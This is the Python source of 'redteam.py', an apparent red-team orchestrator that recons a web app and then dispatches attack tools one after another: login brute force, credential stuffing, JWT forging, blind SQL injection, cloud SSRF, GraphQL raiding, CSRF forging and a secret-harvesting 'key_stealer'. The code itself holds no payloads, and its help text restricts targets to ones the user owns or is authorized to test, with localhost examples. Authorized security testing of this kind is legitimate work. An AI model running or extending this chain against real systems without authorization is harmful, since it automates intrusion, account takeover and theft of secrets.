#!/usr/bin/env python3
"""
redteam.py — Autonomous chained kill-chain (INTERNAL edition).

Ties the whole internal arsenal into one adaptive pass. It recons the target,
figures out what the surface actually offers (login/signup, JWT, injectable
params, state-changing forms), then dispatches the right specialist tool at each
opportunity with arguments derived from recon — instead of you wiring them by
hand. Results are aggregated into one report.

Flow:
  recon → (headers, secrets) → if auth surface: intruder + credstuff + jwt_forge
        → if injectable params: blind_sqli → if POST forms: csrf_forge

    python TOOLS/redteam.py --url http://127.0.0.1:3456/
    python TOOLS/redteam.py --url http://127.0.0.1:8800/ --user demo --pass demo1234
"""
import argparse
import os
import re
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool
from privacy_guard import privacy_user_agent

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS = os.path.join(ROOT, "TOOLS")

RECON_PATHS = ["/", "/login", "/signup", "/register", "/dashboard", "/search",
               "/api/login", "/api", "/account"]
LOGIN_HINTS = ("/login", "/signin", "/api/login", "/auth/login", "/session", "/api/session")
SIGNUP_HINTS = ("/signup", "/register", "/api/signup", "/api/register")
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]*")
FORM_RE = re.compile(r"<form[^>]*>(.*?)</form>", re.I | re.S)
ACTION_RE = re.compile(r'action\s*=\s*["\']([^"\']+)["\']', re.I)
METHOD_RE = re.compile(r'method\s*=\s*["\']([^"\']+)["\']', re.I)
INPUT_RE = re.compile(r'<input[^>]*name\s*=\s*["\']([^"\']+)["\']', re.I)
LINK_RE = re.compile(r'href\s*=\s*["\']([^"\'#]+)["\']', re.I)


class RedTeam(VibeTool):
    def __init__(self, base):
        super().__init__("RedTeam", "Autonomous Chained Kill-Chain")
        self.base = base.rstrip("/")
        self.results = []  # (phase, tool, hacks, crits)

    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        # Don't follow redirects during recon: a `/`->`/login` 303 must be seen
        # as a redirect, not silently resolved to the login page under path "/".
        def redirect_request(self, *a, **k):
            return None

    def _get(self, path):
        try:
            op = urllib.request.build_opener(self._NoRedirect())
            req = urllib.request.Request(self.base + path,
                                         headers={"User-Agent": privacy_user_agent("RedTeam")})
            with op.open(req, timeout=8) as r:
                return r.getcode(), r.read(60000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(60000).decode("utf-8", "replace")
        except Exception:
            return 0, ""

    def _run_tool(self, tool, args, phase, label=None):
        label = label or tool
        self.log(f"→ dispatch {label} {' '.join(a for a in args if not a.startswith('--pass'))[:70]}")
        sys.stdout.flush()
        try:
            p = subprocess.run([sys.executable, os.path.join(TOOLS, f"{tool}.py"), *args],
                               cwd=ROOT, capture_output=True, text=True, timeout=120)
            out = (p.stdout or "") + (p.stderr or "")
        except subprocess.TimeoutExpired:
            out = "[timeout]"
        hacks, crits = out.count("🔥 HACK"), out.count("🔴 CRITICAL")
        self.results.append((phase, label, hacks, crits))
        tag = "hack" if hacks else ("crit" if crits else "pass")
        self.log(f"   {label}: {hacks} hack / {crits} crit", tag)
        return out

    def _post_login(self, path, user, password, user_field):
        """POST creds to a candidate login path — catches POST-only login APIs
        (which GET recon can't see) and confirms JWT usage from the response."""
        data = urllib.parse.urlencode({user_field: user, "password": password}).encode()
        try:
            op = urllib.request.build_opener(self._NoRedirect())
            req = urllib.request.Request(self.base + path, data=data, method="POST",
                headers={"User-Agent": privacy_user_agent("RedTeam"),
                         "Content-Type": "application/x-www-form-urlencoded"})
            with op.open(req, timeout=8) as r:
                st, body, hdr = r.getcode(), r.read(20000).decode("utf-8", "replace"), r.headers
        except urllib.error.HTTPError as e:
            st, body, hdr = e.code, e.read(20000).decode("utf-8", "replace"), e.headers
        except Exception:
            return 0, "", False
        has_jwt = bool(JWT_RE.search(body))
        try:
            has_jwt = has_jwt or bool(JWT_RE.search(hdr.get("Set-Cookie") or ""))
        except Exception:
            pass
        return st, body, has_jwt

    def _gql_probe(self):
        """POST an introspection query to common GraphQL paths."""
        for gp in ("/graphql", "/api/graphql", "/query", "/v1/graphql", "/gql"):
            try:
                req = urllib.request.Request(self.base + gp,
                    data=b'{"query":"{__schema{types{name}}}"}', method="POST",
                    headers={"User-Agent": privacy_user_agent("RedTeam"),
                             "Content-Type": "application/json"})
                with urllib.request.urlopen(req, timeout=6) as r:
                    body = r.read(4000).decode("utf-8", "replace")
                if "__schema" in body or '"data"' in body or '"errors"' in body:
                    return gp
            except Exception:
                continue
        return ""

    def recon(self):
        self.log("=== PHASE 1: RECON ===")
        surface = {"login": "", "signup": "", "jwt": False, "get_params": {},
                   "post_forms": [], "pages": {}, "graphql": ""}
        for path in RECON_PATHS:
            st, body = self._get(path)
            if st == 0:
                continue
            surface["pages"][path] = st
            if st in (200, 302, 303, 401) and path in LOGIN_HINTS and ("password" in body.lower() or path.startswith("/api") or st in (302, 303, 401)):
                surface["login"] = surface["login"] or path
            if st in (200, 302, 303) and path in SIGNUP_HINTS:
                surface["signup"] = surface["signup"] or path
            if JWT_RE.search(body):
                surface["jwt"] = True
            # Harvest forms (POST -> csrf candidates) and inputs.
            for form in FORM_RE.findall(body):
                names = INPUT_RE.findall(form)
                action_m = ACTION_RE.search(form)
                # method lives on the <form ...> tag, which the greedy body regex
                # dropped; re-detect from the page around the form.
                mm = METHOD_RE.search(body)
                method = (mm.group(1).upper() if mm else "POST")
                action = action_m.group(1) if action_m else path
                if method == "POST" and names:
                    surface["post_forms"].append((action, names))
                if "password" in [n.lower() for n in names] and not surface["login"]:
                    surface["login"] = action
            # Harvest GET query params from links.
            for href in LINK_RE.findall(body):
                pr = urllib.parse.urlparse(href)
                for k in urllib.parse.parse_qs(pr.query):
                    surface["get_params"].setdefault(pr.path or path, set()).add(k)
        surface["graphql"] = self._gql_probe()
        self.log(f"Surface: login={surface['login'] or '-'} signup={surface['signup'] or '-'} "
                 f"jwt={surface['jwt']} graphql={surface['graphql'] or '-'} "
                 f"get-params={sum(len(v) for v in surface['get_params'].values())} "
                 f"post-forms={len(surface['post_forms'])}")
        return surface

    def run(self, user, password, login_override, user_field):
        self.banner()
        self.log(f"Autonomous assault on: {self.base}")
        surface = self.recon()
        login = login_override or surface["login"]

        # If creds are supplied, POST-probe candidate login paths — this reveals
        # POST-only login APIs (invisible to GET recon) and confirms JWT usage.
        if user and password:
            candidates = [c for c in [login_override, login, "/api/login", "/login"] if c]
            seen = set()
            for lp in candidates + list(LOGIN_HINTS):
                if lp in seen:
                    continue
                seen.add(lp)
                st, _, jwt = self._post_login(lp, user, password, user_field)
                if jwt or st in (200, 302, 303):
                    login = login or lp
                    if jwt:
                        surface["jwt"] = True
                        login = lp
                        self.log(f"POST-login probe: {lp} returned a JWT — login={lp}, JWT auth confirmed")
                        break

        # Phase 2 — always-on quick hits.
        self.log("=== PHASE 2: SURFACE AUDIT ===")
        self._run_tool("vibe_headers", ["--url", self.base + "/"], "surface")
        self._run_tool("key_stealer", ["--url", self.base + "/"], "surface")

        # Phase 3 — auth-driven, if there's an auth surface.
        if login:
            self.log(f"=== PHASE 3: AUTHENTICATED ATTACKS (login={login}) ===")
            self._run_tool("intruder", ["--url", self.base + "/",
                                        *(["--login", login] if login else []),
                                        "--user-field", user_field], "auth")
            if user:
                self._run_tool("credstuff", ["--url", self.base + "/", "--login", login,
                                             "--user", user, "--user-field", user_field], "auth")
            if surface["jwt"] and user:
                # Guess a protected endpoint to confirm against.
                protected = next((p for p in ("/api/admin", "/admin", "/api/me", "/account")
                                  if surface["pages"].get(p) in (200, 401, 403)), "/api/admin")
                self._run_tool("jwt_forge", ["--url", self.base + "/", "--login", login,
                                            "--user", user, "--pass", password,
                                            "--user-field", user_field, "--protected", protected], "auth")
        else:
            self.log("=== PHASE 3: skipped (no login surface detected) ===")

        # Phase 4 — injection on discovered GET params (SQLi + SSRF on url-like ones).
        tested = 0
        url_like = ("url", "uri", "target", "dest", "redirect", "next", "fetch",
                    "callback", "webhook", "image", "img", "src", "proxy", "u")
        for path, params in surface["get_params"].items():
            for param in list(params)[:2]:
                if tested >= 4:
                    break
                url = self.base + path + "?" + urllib.parse.urlencode({param: "test"})
                self._run_tool("blind_sqli", ["--url", url, "--param", param], "injection",
                               label=f"blind_sqli({param})")
                if param.lower() in url_like:
                    self._run_tool("ssrf_cloud", ["--url", url, "--param", param,
                                                  "--self", self.base], "ssrf",
                                   label=f"ssrf_cloud({param})")
                tested += 1
        if not tested:
            self.log("=== PHASE 4: no GET params discovered to fuzz ===")

        # Phase 4b — GraphQL, if an endpoint was found.
        if surface["graphql"]:
            self._run_tool("graphql_raider", ["--url", self.base + "/",
                                              "--endpoint", surface["graphql"]], "graphql")

        # Phase 5 — CSRF on a discovered POST form (needs a session).
        if login and surface["post_forms"]:
            action, names = surface["post_forms"][0]
            fields = "&".join(f"{n}=rt" for n in names if n.lower() not in ("username", "password"))
            if fields:
                self._run_tool("csrf_forge", ["--url", self.base + "/", "--endpoint", action,
                                              "--data", fields, "--login", login,
                                              *(["--user", user, "--pass", password] if user else []),
                                              "--user-field", user_field], "csrf")

        # Summary.
        self.log("=" * 46)
        total_h = sum(r[2] for r in self.results)
        total_c = sum(r[3] for r in self.results)
        self.log(f"CHAIN COMPLETE — {len(self.results)} tools dispatched, "
                 f"{total_h} hack signal(s), {total_c} critical(s)", "hack" if total_h else "pass")
        for phase, tool, h, c in self.results:
            if h or c:
                self.log(f"  [{phase}] {tool}: {h} hack / {c} crit", "hack" if h else "crit")
        return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="RedTeam - autonomous chained kill-chain")
    p.add_argument("--url", required=True, help="Target base URL you own/are authorized to test")
    p.add_argument("--user", default="", help="A username to use for authed phases")
    p.add_argument("--pass", dest="password", default="", help="Password for --user")
    p.add_argument("--login", default="", help="Override the detected login path")
    p.add_argument("--user-field", default="username", help="Login username field name")
    p.add_argument("-v", "--version", action="version", version="RedTeam 1.0.0")
    args = p.parse_args(argv)
    return RedTeam(args.url).run(args.user, args.password, args.login, args.user_field)


if __name__ == "__main__":
    sys.exit(main())
